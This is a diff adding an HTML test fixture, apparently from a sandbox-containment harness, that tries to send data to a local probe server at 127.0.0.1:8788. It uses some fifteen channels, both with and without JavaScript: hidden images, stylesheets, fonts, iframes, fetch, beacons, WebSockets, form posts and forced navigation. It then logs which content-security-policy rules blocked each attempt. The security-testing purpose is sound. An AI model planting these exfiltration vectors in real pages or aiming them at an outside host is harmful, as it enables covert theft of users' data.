@@ -1,0 +1,252 @@
+<!doctype html>
+<meta name="harness-artefacto" content="documento">
+<title>Artefacto hostil — intenta salir a la red</title>
+<style>
+  :root { color-scheme: light dark; }
+  body { font: 14px/1.6 ui-sans-serif, -apple-system, system-ui, sans-serif; margin: 0; padding: 20px 22px; }
+  h1 { font-size: 20px; margin: 0 0 4px; letter-spacing: -0.01em; }
+  .sub { color: #71717a; margin: 0 0 16px; }
+  .corrida { font-family: ui-monospace, SFMono-Regular, monospace; font-size: 12px; }
+  table { border-collapse: collapse; width: 100%; font-size: 13px; }
+  th, td { text-align: left; padding: 5px 8px; border-bottom: 1px solid #e4e4e7; vertical-align: top; }
+  th { font-weight: 600; }
+  td.vector { font-family: ui-monospace, SFMono-Regular, monospace; font-size: 12px; white-space: nowrap; }
+  .estado { font-family: ui-monospace, SFMono-Regular, monospace; font-size: 11px; padding: 1px 6px; border: 1px solid; border-radius: 4px; }
+  .bloqueado { color: #16794a; }
+  .salio { color: #b42318; }
+  .esperando { color: #a16207; }
+  .nota { margin-top: 16px; padding: 10px 12px; border: 1px solid #e4e4e7; border-radius: 6px; color: #52525b; font-size: 13px; }
+  #violaciones li { font-family: ui-monospace, SFMono-Regular, monospace; font-size: 11px; }
+  @media (prefers-color-scheme: dark) {
+    body { background: #141417; color: #f4f4f5; }
+    th, td, .nota { border-color: #2a2a2f; }
+    .sub, .nota { color: #a1a1aa; }
+    .bloqueado { color: #4ade80; } .salio { color: #f87171; } .esperando { color: #fbbf24; }
+  }
+</style>
+
+<!-- Vectores que NO necesitan JavaScript. Existen porque «no dejes correr
+     scripts» suena a la contención más estricta posible y no lo es: cuatro
+     etiquetas de HTML plano piden red igual, y una imagen remota exfiltra
+     tan bien como un `fetch` — el contenido viaja en la URL. -->
+<img src="http://127.0.0.1:8788/fuga/img-sin-js" width="1" height="1" alt="">
+<link rel="stylesheet" href="http://127.0.0.1:8788/fuga/css-sin-js">
+<style>
+  @font-face { font-family: fuga; src: url("http://127.0.0.1:8788/fuga/font-sin-js"); }
+  .cebo-fuente { font-family: fuga; position: absolute; left: -9999px; }
+  .cebo-fondo { position: absolute; left: -9999px; width: 1px; height: 1px;
+                background-image: url("http://127.0.0.1:8788/fuga/css-bg-sin-js"); }
+</style>
+<div class="cebo-fuente">a</div>
+<div class="cebo-fondo"></div>
+<iframe src="http://127.0.0.1:8788/fuga/iframe-sin-js" style="position:absolute;left:-9999px;width:1px;height:1px" title="marco sin js"></iframe>
+
+<h1>Artefacto hostil</h1>
+<p class="sub">
+  Este documento intenta llevarse lo que tenga a la mano a un servidor.
+  Corrida <span class="corrida" id="corrida">…</span> — cada intento le pega a
+  <span class="corrida">http://127.0.0.1:8788/fuga/…</span>.
+</p>
+
+<table>
+  <thead><tr><th>Vector</th><th>Qué intenta</th><th>Lo que vio el propio documento</th></tr></thead>
+  <tbody id="filas"></tbody>
+</table>
+
+<div class="nota">
+  <strong>El juez es el registro de la sonda, no esta tabla.</strong> Una imagen
+  que falla al pintarse se ve igual que una imagen que nunca salió, así que el
+  diagnóstico de aquí adentro no decide nada: decide qué líneas aparecieron en
+  <span class="corrida">node attacks/probe.mjs</span>.
+  <div id="violaciones-caja" hidden>
+    <p style="margin:10px 0 4px"><strong>Bloqueos que reportó la política:</strong></p>
+    <ul id="violaciones" style="margin:0"></ul>
+  </div>
+</div>
+
+<script>
+  // El destino se escribe entero y a mano: si estuviera partido en variables,
+  // alguien podría pensar que lo que falla es la construcción de la URL.
+  var SONDA = "http://127.0.0.1:8788";
+  var corrida = Math.random().toString(36).slice(2, 8);
+  document.getElementById("corrida").textContent = corrida;
+
+  // Qué prefijo lleva cada intento en el registro de la sonda. Copiado a una
+  // carpeta de sesión y abierto por la app, el archivo no tiene URL ni
+  // parámetros: queda en `fuga`, que es como se lee en la evidencia del PR.
+  var RUTA = "fuga";
+  try { RUTA = new URLSearchParams(location.search).get("ruta") || "fuga"; } catch (e) {}
+
+  function url(vector) {
+    // El contenido del documento viaja en la URL, que es exactamente la forma
+    // en que se exfiltra de verdad: no hace falta leer la respuesta.
+    return SONDA + "/" + RUTA + "/" + vector + "?corrida=" + corrida + "&carga=" +
+      encodeURIComponent(document.title.slice(0, 40));
+  }
+
+  var filas = document.getElementById("filas");
+  function fila(vector, que) {
+    var tr = document.createElement("tr");
+    tr.innerHTML = '<td class="vector">' + vector + "</td><td>" + que +
+      '</td><td><span class="estado esperando">esperando</span></td>';
+    filas.appendChild(tr);
+    return {
+      dice: function (texto, clase) {
+        var s = tr.lastElementChild.firstElementChild;
+        s.textContent = texto;
+        s.className = "estado " + clase;
+      },
+    };
+  }
+
+  function intento(vector, que, fn) {
+    var f = fila(vector, que);
+    try {
+      var r = fn(f);
+      if (r && r.then) r.then(function () { f.dice("salió", "salio"); },
+                              function (e) { f.dice("rechazado: " + String(e.name || e), "bloqueado"); });
+    } catch (e) {
+      f.dice("excepción: " + String(e.name || e), "bloqueado");
+    }
+  }
+
+  intento("fetch()", "GET con el contenido en la URL", function () {
+    return fetch(url("fetch"), { mode: "no-cors" });
+  });
+
+  intento("fetch() POST", "manda el cuerpo, no la URL", function () {
+    return fetch(url("fetch-post"), { method: "POST", mode: "no-cors", body: "contenido-del-repo" });
+  });
+
+  intento("XMLHttpRequest", "la vía vieja, por si la CSP solo mira fetch", function (f) {
+    var x = new XMLHttpRequest();
+    x.onload = function () { f.dice("salió", "salio"); };
+    x.onerror = function () { f.dice("error de red", "bloqueado"); };
+    x.open("GET", url("xhr"));
+    x.send();
+  });
+
+  intento("new Image()", "una imagen remota es una petición GET", function (f) {
+    var img = new Image();
+    img.onload = function () { f.dice("salió", "salio"); };
+    img.onerror = function () { f.dice("no cargó", "bloqueado"); };
+    img.src = url("img");
+  });
+
+  intento("navigator.sendBeacon", "el envío que sobrevive al cierre", function (f) {
+    if (!navigator.sendBeacon) return f.dice("no existe aquí", "bloqueado");
+    var ok = navigator.sendBeacon(url("beacon"), "contenido-del-repo");
+    f.dice(ok ? "aceptado por el navegador" : "rechazado", ok ? "salio" : "bloqueado");
+  });
+
+  intento("WebSocket", "conexión persistente a otro host", function (f) {
+    var ws = new WebSocket("ws://127.0.0.1:8788/" + RUTA + "/websocket?corrida=" + corrida);
+    ws.onopen = function () { f.dice("abierto", "salio"); };
+    ws.onerror = function () { f.dice("no abrió", "bloqueado"); };
+  });
+
+  intento("EventSource", "otro canal largo, otra API", function (f) {
+    var es = new EventSource(url("eventsource"));
+    es.onopen = function () { f.dice("abierto", "salio"); };
+    es.onerror = function () { f.dice("no abrió", "bloqueado"); es.close(); };
+  });
+
+  intento("<script src>", "cargar código de afuera", function (f) {
+    var s = document.createElement("script");
+    s.onload = function () { f.dice("cargó", "salio"); };
+    s.onerror = function () { f.dice("no cargó", "bloqueado"); };
+    s.src = url("script");
+    document.head.appendChild(s);
+  });
+
+  intento("<link rel=stylesheet>", "una hoja de estilo remota", function (f) {
+    var l = document.createElement("link");
+    l.rel = "stylesheet";
+    l.onload = function () { f.dice("cargó", "salio"); };
+    l.onerror = function () { f.dice("no cargó", "bloqueado"); };
+    l.href = url("css");
+    document.head.appendChild(l);
+  });
+
+  intento("@font-face", "una fuente remota también es red", function (f) {
+    var s = document.createElement("style");
+    s.textContent = '@font-face { font-family: fuga; src: url("' + url("font") + '"); }';
+    document.head.appendChild(s);
+    var d = document.createElement("div");
+    d.style.cssText = "font-family: fuga; position: absolute; left: -9999px";
+    d.textContent = "a";
+    document.body.appendChild(d);
+    f.dice("pedida — decide la sonda", "esperando");
+  });
+
+  intento("background-image", "CSS puede pedir red sin JavaScript", function (f) {
+    var d = document.createElement("div");
+    d.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;background-image:url("' + url("css-bg") + '")';
+    document.body.appendChild(d);
+    f.dice("pedida — decide la sonda", "esperando");
+  });
+
+  intento("<iframe src>", "un marco hijo hacia afuera", function (f) {
+    var i = document.createElement("iframe");
+    i.style.cssText = "position:absolute;left:-9999px;width:1px;height:1px";
+    i.onload = function () { f.dice("cargó", "salio"); };
+    i.onerror = function () { f.dice("no cargó", "bloqueado"); };
+    i.src = url("iframe");
+    document.body.appendChild(i);
+  });
+
+  intento("form.submit()", "un formulario manda datos sin fetch", function (f) {
+    // El envío va a un marco propio y no a `_blank`: una ventana nueva la para
+    // el bloqueador de ventanas emergentes hasta sin candados, y entonces el
+    // control negativo no probaría nada.
+    var oculto = document.createElement("iframe");
+    oculto.name = "destino-form";
+    oculto.style.cssText = "position:absolute;left:-9999px;width:1px;height:1px";
+    document.body.appendChild(oculto);
+    var fo = document.createElement("form");
+    fo.method = "POST";
+    fo.action = url("form");
+    fo.target = "destino-form";
+    var inp = document.createElement("input");
+    inp.name = "carga";
+    inp.value = "contenido-del-repo";
+    fo.appendChild(inp);
+    document.body.appendChild(fo);
+    // El marco destino necesita existir antes del envío; sin la espera, el
+    // nombre no resuelve y el navegador intenta una ventana nueva, que el
+    // bloqueador de emergentes para hasta en el control negativo.
+    setTimeout(function () { fo.submit(); }, 300);
+    f.dice("enviado — decide la sonda", "esperando");
+  });
+
+  // Los tres de abajo se llevan la vista si funcionan. Van con cuenta atrás
+  // para que la pantalla se pueda ver —y capturar— antes.
+  var tardios = fila("navegación", "location.href, window.open y meta refresh");
+  var quedan = 6;
+  var reloj = setInterval(function () {
+    quedan -= 1;
+    tardios.dice("en " + quedan + "s…", "esperando");
+    if (quedan > 0) return;
+    clearInterval(reloj);
+    tardios.dice("disparada — decide la sonda", "esperando");
+    try { window.open(url("window-open"), "_blank"); } catch (e) {}
+    var m = document.createElement("meta");
+    m.httpEquiv = "refresh";
+    m.content = "3;url=" + url("meta-refresh");
+    document.head.appendChild(m);
+    try { location.href = url("navegacion"); } catch (e) {}
+  }, 1000);
+
+  // Lo que la política reporta cuando bloquea. Es el testigo del lado del
+  // documento, y el único que dice QUÉ directiva paró cada intento.
+  var vistas = {};
+  document.addEventListener("securitypolicyviolation", function (e) {
+    var clave = e.violatedDirective + " → " + String(e.blockedURI).slice(0, 60);
+    if (vistas[clave]) return;
+    vistas[clave] = true;
+    document.getElementById("violaciones-caja").hidden = false;
+    var li = document.createElement("li");
+    li.textContent = clave;
+    document.getElementById("violaciones").appendChild(li);
+  });
+</script>
